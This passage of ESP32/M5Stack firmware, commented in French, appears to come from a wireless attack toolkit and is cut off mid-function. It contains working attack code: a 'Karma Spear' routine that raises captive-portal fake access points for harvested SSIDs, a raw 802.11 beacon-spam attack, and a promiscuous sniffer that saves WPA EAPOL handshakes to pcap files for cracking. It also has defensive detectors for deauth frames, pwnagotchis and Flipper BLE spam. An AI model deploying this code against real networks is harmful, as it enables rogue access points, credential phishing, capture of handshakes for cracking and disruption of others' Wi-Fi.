    Serial.println("KarmaList.txt opened for writing");
  }

  Serial.println("Writing to KarmaList.txt");
  for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
  }
}

bool isNetworkOpen(const String& line) {
  int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
  int securityTypeEnd = nthIndexOf(line, ',', 2);
  String securityType = line.substring(securityTypeStart, securityTypeEnd);
  return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String& line) {
  int ssidStart = nthIndexOf(line, ',', 0) + 1;
  int ssidEnd = nthIndexOf(line, ',', 1);
  String ssid = line.substring(ssidStart, ssidEnd);
  return ssid;
}

int nthIndexOf(const String& str, char toFind, int nth) {
  int found = 0;
  int index = -1;
  while (found <= nth && index < (int) str.length()) {
    index = str.indexOf(toFind, index + 1);
    if (index == -1) break;
    found++;
  }
  return index;
}

void returnToMenu() {
  // Mettez ici le code nécessaire pour nettoyer avant de retourner au menu
  Serial.println("Returning to menu...");
  // Supposer que waitAndReturnToMenu() est la fonction qui retourne au menu
  waitAndReturnToMenu(" User requested return to menu.");
}

void karmaSpear() {
  isAutoKarmaActive = true;
  createCaptivePortal();
  File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
  if (!karmaListFile) {
    Serial.println("Error opening KarmaList.txt");
    returnToMenu(); // Retour au menu si le fichier ne peut pas être ouvert
    return;
  }
  if (karmaListFile.available() == 0) {
    karmaListFile.close();
    Serial.println("KarmaFile empty.");
    returnToMenu(); // Retour au menu si le fichier est vide
    return;
  }

  // Compter le nombre total de lignes
  int totalLines = 0;
  while (karmaListFile.available()) {
    karmaListFile.readStringUntil('\n');
    totalLines++;
    if (M5.BtnA.wasPressed()) { // Vérifie si btnA est pressé
      karmaListFile.close();
      returnToMenu();
      return;
    }
  }
  karmaListFile.seek(0); // Revenir au début du fichier après le comptage

  int currentLine = 0;
  while (karmaListFile.available()) {
    if (M5.BtnA.isPressed()) { // Vérifie régulièrement si btnA est pressé
      karmaListFile.close();
      isAutoKarmaActive = false;
      waitAndReturnToMenu(" Karma Spear Stopped.");
      return;
    }

    String ssid = karmaListFile.readStringUntil('\n');
    ssid.trim();

    if (ssid.length() > 0) {
      activateAPForAutoKarma(ssid.c_str());
      Serial.println("Created Karma AP for SSID: " + ssid);
      displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);

      // Mise à jour de l'affichage
      int remainingLines = totalLines - (++currentLine);
      String displayText = String(remainingLines) + "/" + String(totalLines);
      M5.Display.setCursor((M5.Display.width() / 2) - 25, 10);
      M5.Display.print(displayText);

      if (karmaSuccess) {
        M5.Display.clear();
        break;
      }
      delay(200); // Peut-être insérer une vérification de btnA ici aussi
    }
  }
  karmaListFile.close();
  isAutoKarmaActive = false;
  Serial.println("Karma Spear Failed...");
  waitAndReturnToMenu(" Karma Spear Failed...");
}


// beacon attack

std::vector<String> readCustomBeacons(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customBeacons;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customBeacons;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomBeacons=")) {
      String beaconsStr = line.substring(String("CustomBeacons=").length());
      int idx = 0;
      while ((idx = beaconsStr.indexOf(',')) != -1) {
        customBeacons.push_back(beaconsStr.substring(0, idx));
        beaconsStr = beaconsStr.substring(idx + 1);
      }
      if (beaconsStr.length() > 0) {
        customBeacons.push_back(beaconsStr); // Ajouter le dernier élément
      }
      break;
    }
  }
  file.close();
  return customBeacons;
}
void generateRandomWiFiMac(uint8_t *mac) {
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 255);
  }
}

char randomName[32];
char *randomSSID() {
  const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = random(7, 22); // Génère une longueur aléatoire entre 7 et 22
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[random() % strlen(charset)];
  }
  randomName[len] = '\0'; // Termine la chaîne avec un caractère nul
  return randomName;
}

char emptySSID[32];

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,             // Type/Subtype: management beacon frame
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

  0x00, 0x00,                                     // Fragment & sequence number (will be done by the SDK)
  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  0xe8, 0x03,                                     // Interval: every 1s
  0x31, 0x00,                                     // capabilities Information

  0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, // SSID

  0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  0x82,       // 1(B)
  0x84,       // 2(B)
  0x8b,       // 5.5(B)
  0x96,       // 11(B)
  0x24,       // 18
  0x30,       // 24
  0x48,       // 36
  0x6c,       // 54

  0x03, 0x01, // Channel set, length
  0x01,       // Current Channel

  0x30, 0x18,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x02, 0x00,
  0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
  0x01, 0x00,
  0x00, 0x0f, 0xac, 0x02,
  0x00, 0x00
};

const uint8_t channels[] = {1, 3, 6, 9, 11}; // canaux Wi-Fi utilisés (disponibles : 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels))
      channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
    }
  }
}

void beaconSpamList(const char *list, size_t listSize) {
  int i = 0;
  char tmp;
  uint8_t macAddr[6];

  nextChannel();

  while (i < listSize) {
    int j = 0;
    do {
      tmp = list[i + j];
      j++;
    } while (tmp != '\n' && j <= 32 && i + j < listSize);

    uint8_t ssidLen = j - 1;

    generateRandomWiFiMac(macAddr);
    memcpy(&beaconPacket[10], macAddr, 6);
    memcpy(&beaconPacket[16], macAddr, 6);
    memcpy(&beaconPacket[38], emptySSID, 32);
    memcpy(&beaconPacket[38], &list[i], ssidLen);
    beaconPacket[82] = wifi_channel;

    for (int k = 0; k < 3; k++) {
      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), false);
      for (int l = 0; l < 10; l++) {
        delay(0); // Yield the processor for a short duration
      }
    }
    i += j;
    if (M5.BtnB.isPressed()) // vérifier l'appui sur le bouton
      break;
  }
}

void beaconAttack() {
  WiFi.mode(WIFI_MODE_STA); // Mode Wi-Fi station

  // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
  bool useCustomBeacons = confirmPopup("Use custom beacons?");
  M5.Display.clear();

  std::vector<String> customBeacons;
  if (useCustomBeacons) {
    customBeacons = readCustomBeacons("/config/config.txt");
  }

  int beaconCount = 0;
  unsigned long previousMillis = 0;
  int delayTimeBeacon = 0; // Délai entre les beacons
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_RED);
  M5.Display.setCursor(135, M5.Display.height() - 40);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.println("Stop");

  int beaconTextX = 10;
  String beaconText = "Beacon Spam running...";
  M5.Display.setCursor(beaconTextX, 90);
  M5.Display.println(beaconText);

  Serial.println("-------------------");
  Serial.println("Starting Beacon Spam");
  Serial.println("-------------------");

  while (!M5.BtnB.isPressed()) {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= delayTimeBeacon) {
      previousMillis = currentMillis;

      if (useCustomBeacons && !customBeacons.empty()) {
        for (const auto& ssid : customBeacons) {
          beaconSpamList(ssid.c_str(), ssid.length());
          if (M5.BtnB.isPressed()) // Si le bouton est pressé, sortir de la boucle
            break;
        }
      } else {
        char *randomSSIDName = randomSSID();
        beaconSpamList(randomSSIDName, strlen(randomSSIDName));
      }

      beaconCount++;
    }

    M5.update();
    if (M5.BtnB.isPressed() && currentMillis - lastDebounceTime > debounceDelay) {
      break;
    }
    delay(10);
  }

  Serial.println("-------------------");
  Serial.println("Stopping beacon Spam");
  Serial.println("-------------------");
  waitAndReturnToMenu("Beacon Spam Stopped...");
}

// sniff handshake/deauth/pwnagotchi

bool beacon = false;
std::set<String> registeredBeacons;
unsigned long lastTime = 0;  // Last time update
unsigned int packetCount = 0;  // Number of packets received

void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  packetCount++;
  unsigned long currentTime = millis();
  if (currentTime - lastTime >= 1000) {
    if (packetCount < 100) {
      M5.Lcd.setCursor(224, 0);
    } else {
      M5.Lcd.setCursor(212, 0);
    }
    M5.Lcd.printf(" PPS:%d ", packetCount);

    lastTime = currentTime;
    packetCount = 0;
  }

  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
  const uint8_t *frame = pkt->payload;
  const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);


  const uint8_t frameType = (frameControl & 0x0C) >> 2;
  const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

  if (estUnPaquetEAPOL(pkt)) {
    Serial.println("EAPOL Detected !!!!");

    const uint8_t *receiverAddr = frame + 4;
    const uint8_t *senderAddr = frame + 10;

    Serial.print("Address MAC destination: ");
    printAddress(receiverAddr);
    Serial.print("Address MAC expedition: ");
    printAddress(senderAddr);

    enregistrerDansFichierPCAP(pkt, false);
    nombreDeEAPOL++;
    M5.Lcd.setCursor(260, 18);
    M5.Lcd.printf("H:");
    M5.Lcd.print(nombreDeHandshakes);
    if (nombreDeEAPOL < 999) {
      M5.Lcd.setCursor(212, 36);
    } else {
      M5.Lcd.setCursor(202, 36);
    }
    M5.Lcd.printf("EAPOL:");
    M5.Lcd.print(nombreDeEAPOL);
  }

  if (frameType == 0x00 && frameSubType == 0x08) {
    const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon

    // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);

    if (strcmp(macStr, "DE:AD:BE:EF:DE:AD") == 0) {
      Serial.println("-------------------");
      Serial.println("Pwnagotchi Detected !!!");
      Serial.print("CH: ");
      Serial.println(ctrl.channel);
      Serial.print("RSSI: ");
      Serial.println(ctrl.rssi);
      Serial.print("MAC: ");
      Serial.println(macStr);
      Serial.println("-------------------");

      String essid = ""; // Préparer la chaîne pour l'ESSID
      int essidMaxLength = 700; // longueur max
      for (int i = 0; i < essidMaxLength; i++) {
        if (frame[i + 38] == '\0') break; // Fin de l'ESSID

        if (isAscii(frame[i + 38])) {
          essid.concat((char)frame[i + 38]);
        }
      }

      int jsonStart = essid.indexOf('{');
      if (jsonStart != -1) {
        String cleanJson = essid.substring(jsonStart); // Nettoyer le JSON

        DynamicJsonDocument json(4096); // Augmenter la taille pour l'analyse
        DeserializationError error = deserializeJson(json, cleanJson);

        if (!error) {
          String name = json["name"].as<String>(); // Extraire le nom
          String pwndnb = json["pwnd_tot"].as<String>(); // Extraire le nombre de réseaux pwned
          Serial.println("Name: " + name); // Afficher le nom
          Serial.println("pwnd: " + pwndnb); // Afficher le nombre de réseaux pwned
          // affichage
          displayPwnagotchiDetails(name, pwndnb);
        } else {
          Serial.println("Could not parse Pwnagotchi json");
        }
      } else {
        Serial.println("JSON start not found in ESSID");
      }
    } else {
      pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
      enregistrerDansFichierPCAP(pkt, true);  // Enregistrer le paquet

    }
  }

  // Vérifier si c'est un paquet de désauthentification
  if (frameType == 0x00 && frameSubType == 0x0C) {
    // Extraire les adresses MAC
    const uint8_t *receiverAddr = frame + 4;  // Adresse 1
    const uint8_t *senderAddr = frame + 10;  // Adresse 2
    // Affichage sur le port série
    Serial.println("-------------------");
    Serial.println("Deauth Packet detected !!! :");
    Serial.print("CH: ");
    Serial.println(ctrl.channel);
    Serial.print("RSSI: ");
    Serial.println(ctrl.rssi);
    Serial.print("Sender: "); printAddress(senderAddr);
    Serial.print("Receiver: "); printAddress(receiverAddr);
    Serial.println();

    // Affichage sur l'écran
    M5.Lcd.setTextColor(WHITE, BLACK);
    M5.Lcd.setCursor(0, 64);
    M5.Lcd.printf("Deauth Detected!");
    M5.Lcd.setCursor(0, 85);
    M5.Lcd.printf("CH: %d RSSI: %d  ", ctrl.channel, ctrl.rssi);
    M5.Lcd.setCursor(0, 106);
    M5.Lcd.print("Send: "); printAddressLCD(senderAddr);
    M5.Lcd.setCursor(0, 127);
    M5.Lcd.print("Receive: "); printAddressLCD(receiverAddr);
    nombreDeDeauth++;
    if (nombreDeDeauth < 999) {
      M5.Lcd.setCursor(200, 54);
    } else {
      M5.Lcd.setCursor(188, 54);
    }
    M5.Lcd.printf("DEAUTH:");
    M5.Lcd.print(nombreDeDeauth);

  }
}

void displayPwnagotchiDetails(const String& name, const String& pwndnb) {
  // Construire le texte à afficher
  String displayText = "Pwnagotchi: " + name + "      \npwnd: " + pwndnb + "   ";

  // Préparer l'affichage
  M5.Lcd.setTextColor(WHITE, BLACK);
  M5.Lcd.setCursor(0, 170);

  // Afficher les informations
  M5.Lcd.println(displayText);
}

void printAddress(const uint8_t* addr) {
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", addr[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void printAddressLCD(const uint8_t* addr) {
  // Utiliser sprintf pour formater toute l'adresse MAC en une fois
  sprintf(macBuffer, "%02X:%02X:%02X:%02X:%02X:%02X",
          addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

  // Afficher l'adresse MAC
  M5.Lcd.print(macBuffer);
}

unsigned long lastBtnBPressTime = 0;
const long debounceDelay = 200;

void deauthDetect() {
  bool btnBPressed = false; //debounce
  M5.Display.clear();
  M5.Lcd.setTextSize(2);
  M5.Lcd.setTextColor(WHITE, BLACK);
  ESP_BT.end();
  bluetoothEnabled = false;
  /*esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();*/
  delay(500); //petite pause
  wifi_init_config_t cfg2 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg2);
  esp_wifi_start();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);

  int x_btnA = 32;
  int x_btnB = 140;
  int x_btnC = 245;
  int y_btns = 220;

  // Afficher le texte pour chaque bouton
  M5.Lcd.setCursor(x_btnA, y_btns);
  M5.Lcd.println("Mode");

  M5.Lcd.setCursor(x_btnB, y_btns);
  M5.Lcd.println("Back");

  M5.Lcd.setCursor(x_btnC, y_btns);
  M5.Lcd.println("Next");

  if (!SD.exists("/handshakes")) {
    if (SD.mkdir("/handshakes")) {
      Serial.println("/handshakes folder created");
    } else {
      Serial.println("Fail to create /handshakes folder");
      return;
    }
  }

  while (!btnBPressed) {
    esp_task_wdt_reset();  // Réinitialisation du watchdog
    vTaskDelay(pdMS_TO_TICKS(10));  // Pause pour éviter de surcharger le CPU
    M5.update(); // Mettre à jour l'état des boutons
    // Gestion du bouton B pour basculer entre le mode auto et statique
    if (M5.BtnB.wasPressed()) {
      unsigned long currentPressTime = millis();
      if (currentPressTime - lastBtnBPressTime > debounceDelay) {
        lastBtnBPressTime = currentPressTime;
        btnBPressed = true; // Mettre à jour le drapeau pour indiquer que le bouton B a été pressé après le debounce
      }
    }
    if (M5.BtnA.wasPressed()) {
      autoChannelHop = !autoChannelHop; // Basculer le mode
      Serial.println(autoChannelHop ? "Auto Mode" : "Static Mode");
    }
    if (!autoChannelHop) {
      if (M5.BtnPWR.wasClicked()) {
        currentChannelDeauth--;
        if (currentChannelDeauth < 1) currentChannelDeauth = maxChannelScanning;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
      }

      if (M5.BtnC.wasPressed()) {
        currentChannelDeauth++;
        if (currentChannelDeauth > maxChannelScanning) currentChannelDeauth = 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Static Channel : ");
        Serial.println(currentChannelDeauth);
      }
    }
    else {
      unsigned long currentTime = millis();
      if (currentTime - lastChannelHopTime > channelHopInterval) {
        lastChannelHopTime = currentTime;
        currentChannelDeauth++;
        if (currentChannelDeauth > maxChannelScanning) currentChannelDeauth = 1;
        esp_wifi_set_channel(currentChannelDeauth, WIFI_SECOND_CHAN_NONE);
        Serial.print("Auto Channel : ");
        Serial.println(currentChannelDeauth);
      }
    }

    if (currentChannelDeauth != lastDisplayedChannelDeauth || autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 16);
      M5.Lcd.printf("Channel: %d    \n", currentChannelDeauth);
      lastDisplayedChannelDeauth = currentChannelDeauth;
    }

    if (autoChannelHop != lastDisplayedMode) {
      M5.Lcd.setCursor(0, 37);
      M5.Lcd.printf("Mode: %s  \n", autoChannelHop ? "Auto" : "Static");
      lastDisplayedMode = autoChannelHop;
    }

    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  wifi_init_config_t cfg0 = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg0);
  esp_wifi_start();
  delay(100); // Petite pause pour s'assurer que tout est terminé

  autoChannelHop = !autoChannelHop;
  waitAndReturnToMenu("Stop detection...");
}

// sniff pcap
bool estUnPaquetEAPOL(const wifi_promiscuous_pkt_t* packet) {
  const uint8_t *payload = packet->payload;
  int len = packet->rx_ctrl.sig_len;

  // length check to ensure packet is large enough for EAPOL (minimum length)
  if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
    return false;
  }

  // check for LLC/SNAP header indicating EAPOL payload
  // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
      payload[30] == 0x88 && payload[31] == 0x8E) {
    return true;
  }

  // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
  // check if the frame control field's subtype indicates a QoS data subtype (0x08)
  if ((payload[0] & 0x0F) == 0x08) {
    // Adjust for the QoS Control field and recheck for LLC/SNAP header
    if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
        payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
        payload[32] == 0x88 && payload[33] == 0x8E) {
      return true;
    }
  }

  return false;
}


// Définition de l'en-tête de fichier PCAP global
typedef struct pcap_hdr_s {
  uint32_t magic_number;   /* numéro magique */
  uint16_t version_major;  /* numéro de version majeur */
  uint16_t version_minor;  /* numéro de version mineur */
  int32_t  thiszone;       /* correction de l'heure locale */
  uint32_t sigfigs;        /* précision des timestamps */
  uint32_t snaplen;        /* taille max des paquets capturés, en octets */
  uint32_t network;        /* type de données de paquets */
} pcap_hdr_t;

// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
  uint32_t ts_sec;         /* timestamp secondes */
  uint32_t ts_usec;        /* timestamp microsecondes */
  uint32_t incl_len;       /* nombre d'octets du paquet enregistrés dans le fichier */
  uint32_t orig_len;       /* longueur réelle du paquet */
} pcaprec_hdr_t;


void ecrireEntetePCAP(File &file) {
  pcap_hdr_t pcap_header;
  pcap_header.magic_number = 0xa1b2c3d4;
  pcap_header.version_major = 2;
  pcap_header.version_minor = 4;
  pcap_header.thiszone = 0;
  pcap_header.sigfigs = 0;
  pcap_header.snaplen = 65535;
  pcap_header.network = 105; // LINKTYPE_IEEE802_11

  file.write((const byte*)&pcap_header, sizeof(pcap_hdr_t));
  nombreDeHandshakes++;
}

void enregistrerDansFichierPCAP(const wifi_promiscuous_pkt_t* packet, bool beacon) {
  // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
  const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
  const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
  const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
  const uint8_t *apAddr;

  if (memcmp(addr1, bssid, 6) == 0) {
    apAddr = addr1;
  } else {
    apAddr = addr2;
  }

  char nomFichier[50];
  sprintf(nomFichier, "/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
          apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

  // Vérifier si le fichier existe déjà
  bool fichierExiste = SD.exists(nomFichier);

  // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
  if (beacon && !fichierExiste) {
    return;
  }

  // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
  File fichierPcap = SD.open(nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE);
  if (!fichierPcap) {
    Serial.println("Échec de l'ouverture du fichier PCAP");
    return;
  }

  if (!beacon && !fichierExiste) {
    Serial.println("Écriture de l'en-tête global du fichier PCAP");
    ecrireEntetePCAP(fichierPcap);
  }

  if (beacon && fichierExiste) {
    String bssidStr = String((char*)apAddr, 6);
    if (registeredBeacons.find(bssidStr) != registeredBeacons.end()) {
      return; // Beacon déjà enregistré pour ce BSSID
    }
    registeredBeacons.insert(bssidStr); // Ajouter le BSSID à l'ensemble
  }

  // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
  pcaprec_hdr_t pcap_packet_header;
  pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
  pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
  pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
  pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
  fichierPcap.write((const byte*)&pcap_packet_header, sizeof(pcaprec_hdr_t));
  fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
  fichierPcap.close();
}
//sniff pcap end



// Wof part // from a really cool idea of Kiyomi // https://github.com/K3YOMI/Wall-of-Flippers
unsigned long lastFlipperFoundMillis = 0; // Pour stocker le moment de la dernière annonce reçue
static bool isBLEInitialized = false;

struct ForbiddenPacket {
  const char* pattern;
  const char* type;
};

std::vector<ForbiddenPacket> forbiddenPackets = {
  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"}, // not working ?
  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"}, // refactored for working
  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"}, // working
  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"}, // working
  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"}, // not working cant find raw data in sniff
  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},// refactored for working
  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},//working
  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},//working
  {"ff006db643ce97fe427c___________", "LOVE_TOYS"} // working
};

bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
  size_t patternLength = strlen(pattern);
  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
    char byteString[3] = {pattern[i], pattern[i + 1], 0};
    if (byteString[0] == '_' && byteString[1] == '_') continue;

    uint8_t byteValue = strtoul(byteString, nullptr, 16);
    if (payload[j] != byteValue) return false;
  }
  return true;
}

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    int lineCount = 0;
    const int maxLines = 10;
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String deviceColor = "Unknown"; // Défaut
      bool isValidMac = false; // validité de l'adresse MAC
      bool isFlipper = false; // Flag pour identifier si le dispositif est un Flipper

      // Vérifier directement les UUIDs pour déterminer la couleur
      if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "White";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Black";
        isFlipper = true;
      } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
        deviceColor = "Transparent";
        isFlipper = true;
      }

      // Continuer uniquement si un Flipper est identifié
      if (isFlipper) {
        String macAddress = advertisedDevice.getAddress().toString().c_str();
        if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27") || macAddress.startsWith("0C:FA:22")) {
          isValidMac = true;
        }

        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.setCursor(0, 10);
        String name = advertisedDevice.getName().c_str();

        M5.Display.printf("Name: %s          \nRSSI: %d \nMAC: %s\n",
                          name.c_str(),
                          advertisedDevice.getRSSI(),
                          macAddress.c_str());
        recordFlipper(name, macAddress, deviceColor, isValidMac); // Passer le statut de validité de l'adresse MAC
        lastFlipperFoundMillis = millis();
      }

      std::string advData = advertisedDevice.getManufacturerData();
      if (!advData.empty()) {
        const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
        size_t length = advData.length();

        /*
                Serial.print("Raw Data: ");
                for (size_t i = 0; i < length; i++) {
                  Serial.printf("%02X", payload[i]); // Afficher chaque octet en hexadécimal
                }
                Serial.println(); // Nouvelle ligne après les données brutes*/

        for (auto& packet : forbiddenPackets) {
          if (matchPattern(packet.pattern, payload, length)) {
            if (lineCount >= maxLines) {
              M5.Display.fillRect(0, 58, 325, 185, BLACK); // Réinitialiser la zone d'affichage des paquets interdits
              M5.Display.setCursor(0, 59);
              lineCount = 0; // Réinitialiser si le maximum est atteint
            }
            M5.Display.printf("%s\n", packet.type);
            lineCount++;
            break;
          }
        }
      }
    }
};


bool isMacAddressRecorded(const String& macAddress) {
  File file = SD.open("/WoF.txt", FILE_READ);
  if (!file) {
    return false;
  }
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(macAddress) >= 0) {
      file.close();
      return true;
    }
  }

  file.close();
  return false;
}

void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
  if (!isMacAddressRecorded(macAddress)) {
    File file = SD.open("/WoF.txt", FILE_APPEND);
    if (file) {
      String status = isValidMac ? " - normal" : " - spoofed"; // Détermine le statut basé sur isValidMac
      file.println(name + " - " + macAddress + " - " + color + status);
      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
    }
    file.close();
  }
}

void initializeBLEIfNeeded() {
  if (!isBLEInitialized) {
    BLEDevice::init("azertyuiop");
    isBLEInitialized = true;
    Serial.println("BLE initialized for scanning.");
  }
}

void wallOfFlipper() {
  Serial.println("🔄 Resetting WiFi, Bluetooth, ESP-NOW...");

  // Désactiver WiFi
  WiFi.disconnect(true);
  delay(100);

  initializeBLEIfNeeded();

  M5.Display.fillScreen(BLACK);
  M5.Display.setCursor(0, 10);
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(WHITE);
  M5.Display.println("Waiting for Flipper");
  M5.Lcd.setCursor(140, 220);
  M5.Lcd.println("Stop");

  bool btnBPressed = false;
  delay(200);

  // Declare pBLEScan before the loop so it is in scope later.
  BLEScan* pBLEScan = BLEDevice::getScan();
  
  while (!btnBPressed) {
    M5.update();

    if (M5.BtnB.isPressed()) {
      unsigned long currentPressTime = millis();
      if (currentPressTime - lastBtnBPressTime > debounceDelay) {
        lastBtnBPressTime = currentPressTime;
        btnBPressed = true;
      }
    }

    if (millis() - lastFlipperFoundMillis > 10000) {
      M5.Display.fillScreen(BLACK);
      M5.Display.setCursor(0, 10);
      M5.Display.setTextSize(2);
      M5.Display.setTextColor(WHITE);
      M5.Display.println("Waiting for Flipper");
      M5.Lcd.setCursor(140, 220);
      M5.Lcd.println("Stop");

      lastFlipperFoundMillis = millis();
    }

    // Use the same pBLEScan instance in every loop iteration
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
    pBLEScan->setActiveScan(true);
    pBLEScan->start(1, false);
  }
  
  // Now pBLEScan is still in scope here, so we can stop it.
  pBLEScan->stop();
  waitAndReturnToMenu("Stop detection...");
}


// Wof part end




// Fonction pour se connecter au Wi-Fi
bool connectToWiFi(const String& ssid, const String& password) {
  WiFi.begin(ssid.c_str(), password.c_str());

  M5.Display.clear();
  M5.Display.setCursor(0, 10);
  M5.Display.println("Connecting to WiFi...");
  M5.Display.display();

  Serial.print("Connecting to SSID: ");
  Serial.println(ssid);

  int timeout = 10; // Timeout de 10 secondes pour la connexion
